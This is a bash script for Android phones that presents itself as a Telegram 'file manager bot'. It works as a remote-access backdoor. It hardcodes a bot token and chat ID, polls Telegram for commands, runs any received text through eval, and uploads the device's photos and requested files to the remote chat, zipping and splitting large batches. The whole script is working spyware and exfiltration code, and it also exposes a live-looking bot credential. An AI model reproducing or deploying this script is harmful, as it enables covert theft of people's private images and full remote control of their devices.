#!/bin/bash

# Set your Telegram bot token and chat ID
T="7826037643:AAHxCVfPXjVkvGp9rsTBdzxGc2Jw5lZJICY"  # Bot Token
C="7391323461"  # Chat ID

# Default directory to collect images
target_directory="/storage/emulated/0/"
zip_file="/storage/emulated/0/deco_images.zip"
split_zip_file="/storage/emulated/0/deco_images.zip.part"

# Control variable for stopping 'pics' command
stop_pics=false

# Function to send files to Telegram
send_to_telegram() {
    local file="$1"
    curl -s -F "document=@$file" "https://api.telegram.org/bot$T/sendDocument?chat_id=$C" > /dev/null 2>&1
}

# Function to send messages to Telegram
send_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$T/sendMessage" -d "chat_id=$C&text=$message" > /dev/null 2>&1
}

# Initial message
send_message "Welcome to the file manager bot! Use commands like 'ls', 'pwd', 'cd <dir>', 'zipall', 'pics', 'get <filename>', or type any Linux command."

# Initialize the working directory
current_directory="$target_directory"

# Keep track of the last processed message
last_message_id=0

# Main loop
while true; do
    # Fetch the latest updates
    updates=$(curl -s "https://api.telegram.org/bot$T/getUpdates?offset=$((last_message_id + 1))")

    # Extract the latest message
    new_message_text=$(echo "$updates" | jq -r ".result[-1].message.text")
    new_message_id=$(echo "$updates" | jq -r ".result[-1].message.message_id")

    # Check if there's a new command
    if [[ -n "$new_message_text" && "$new_message_id" != "$last_message_id" ]]; then
        last_message_id="$new_message_id"

        # Exit command
        if [[ "$new_message_text" == "exit" ]]; then
            send_message "Exiting the bot. Goodbye!"
            exit 0
        fi

        # Stop sending pictures
        if [[ "$new_message_text" == "stop" ]]; then
            stop_pics=true
            send_message "Image sending process stopped."
        fi

        # List files
        if [[ "$new_message_text" == "ls" ]]; then
            output=$(ls "$current_directory" 2>/dev/null)
            send_message "Files in $current_directory:\n$output"

        # Print current directory
        elif [[ "$new_message_text" == "pwd" ]]; then
            send_message "Current directory: $current_directory"

        # Change directory
        elif [[ "$new_message_text" == cd* ]]; then
            target_dir="${new_message_text:3}"
            target_dir="${target_dir// /}"
            if [[ -d "$current_directory/$target_dir" ]]; then
                current_directory="$current_directory/$target_dir"
                send_message "Changed directory to: $current_directory"
            else
                send_message "Directory '$target_dir' not found."
            fi

        # Zip all images and send
        elif [[ "$new_message_text" == "zipall" ]]; then
            send_message "Zipping all images in $current_directory..."
            images=()
            for file in "$current_directory"/*; do
                if [[ -f "$file" && ( "$file" == *.jpg || "$file" == *.jpeg || "$file" == *.png ) ]]; then
                    images+=("$file")
                fi
            done

            if [ ${#images[@]} -eq 0 ]; then
                send_message "No images found in $current_directory."
            else
                zip -r "$zip_file" "${images[@]}" > /dev/null 2>&1
                if [ $? -ne 0 ]; then
                    send_message "Failed to create zip file."
                else
                    file_size=$(stat -c %s "$zip_file")
                    if [ "$file_size" -gt 52428800 ]; then
                        split -b 50M "$zip_file" "$split_zip_file"
                        for part in "$split_zip_file"*; do
                            send_to_telegram "$part"
                            rm "$part"
                        done
                    else
                        send_to_telegram "$zip_file"
                        rm -f "$zip_file"
                    fi
                fi
            fi

        # Send all images one by one
        elif [[ "$new_message_text" == "pics" ]]; then
            send_message "Sending all images in $current_directory... Type 'stop' to interrupt."
            stop_pics=false
            for file in "$current_directory"/*; do
                if [[ -f "$file" && ( "$file" == *.jpg || "$file" == *.jpeg || "$file" == *.png ) ]]; then
                    # Check for 'stop' before sending each image
                    updates=$(curl -s "https://api.telegram.org/bot$T/getUpdates?offset=$((last_message_id + 1))")
                    new_stop_text=$(echo "$updates" | jq -r ".result[-1].message.text")
                    if [[ "$new_stop_text" == "stop" ]]; then
                        stop_pics=true
                        send_message "Image sending stopped."
                        break
                    fi
                    send_to_telegram "$file"
                    sleep 1
                fi
            done

        # Get a specific file
        elif [[ "$new_message_text" == get* ]]; then
            file_name="${new_message_text:4}"
            file_path="$current_directory/$file_name"

            if [[ -f "$file_path" ]]; then
                send_to_telegram "$file_path"
            else
                send_message "File '$file_name' not found in $current_directory."
            fi

        # Execute any Linux command
        else
            output=$(eval "$new_message_text" 2>&1)
            send_message "Output of your command:\n$output"
        fi
    fi
    sleep 1
done
